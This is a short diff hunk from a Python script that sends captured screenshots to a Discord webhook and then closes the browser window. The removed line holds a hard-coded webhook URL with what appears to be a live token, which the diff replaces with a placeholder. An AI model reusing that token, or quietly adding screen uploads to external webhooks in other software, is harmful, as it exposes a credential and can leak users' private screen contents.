@@ -76,7 +76,7 @@ for index, path in enumerate(screenshot_paths):
     files[f"file{index}"] = open(path, "rb")
 
 # Send the POST request to the Discord webhook URL
-response = requests.post("https://discord.com/api/webhooks/1107907570791886870/6AiMQ8o3lwcICNN4TYzDL7ax2seo7hDS5U-jHU9xnXWKzi9X4hPyNLfw7SSlYO48eoVM", data=payload, files=files)
+response = requests.post("YOUR DISCORD WEBHOOK HERE", data=payload, files=files)
 
 # Close the browser window after capturing all screenshots
 pyautogui.hotkey("ctrl", "w")
